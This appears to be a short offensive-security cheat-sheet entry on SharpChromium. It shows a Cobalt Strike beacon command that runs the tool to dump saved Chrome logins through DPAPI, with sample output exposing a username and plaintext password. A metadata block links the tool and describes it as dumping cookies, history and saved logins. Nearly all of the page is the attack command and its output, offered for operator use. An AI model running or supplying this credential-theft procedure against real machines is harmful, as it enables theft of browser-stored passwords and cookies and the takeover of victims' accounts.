# Sharp Chromium

## [[Data Protection API (DPAPI)]]
Dump the Chrome passwords
``````beacon
beacon> execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins

[*] Beginning Google Chrome extraction.

--- Chromium Credential (User: john) ---
URL      : 
Username : john
Password : Sup3rman

[*] Finished Google Chrome extraction.
[*] Done.
``````



```meta
requirements: 
results: 
oss: #win
source: https://github.com/djhohnstein/SharpChromium
description: Dump cookies, history, saved logins from chrome
```